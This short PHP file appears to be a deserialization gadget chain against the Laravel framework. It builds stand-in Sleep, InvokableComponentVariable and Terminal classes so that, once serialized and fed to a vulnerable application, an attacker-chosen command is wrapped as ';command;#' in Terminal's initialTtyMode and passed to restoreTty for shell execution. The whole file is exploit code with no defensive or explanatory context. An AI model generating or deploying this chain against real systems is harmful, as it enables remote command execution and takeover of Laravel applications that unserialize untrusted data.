<?php

namespace Laravel\Prompts {
    class Terminal {
        public $initialTtyMode;

        function __construct($command)
        {
            $this->initialTtyMode = ";".$command.";#";
        }
    }
}

namespace Illuminate\View {
    class InvokableComponentVariable 
    {
        public $callable;

        function __construct($command)
        {
            $this->callable = array(new \Laravel\Prompts\Terminal($command),'restoreTty');
        }
    }
}

namespace Illuminate\Support {
    class Sleep
    {
        public $shouldSleep;
        public $duration;

        function __construct($command)
        {
            $this->shouldSleep = true;
            $this->duration = new \Illuminate\View\InvokableComponentVariable($command);
        }
    }
}

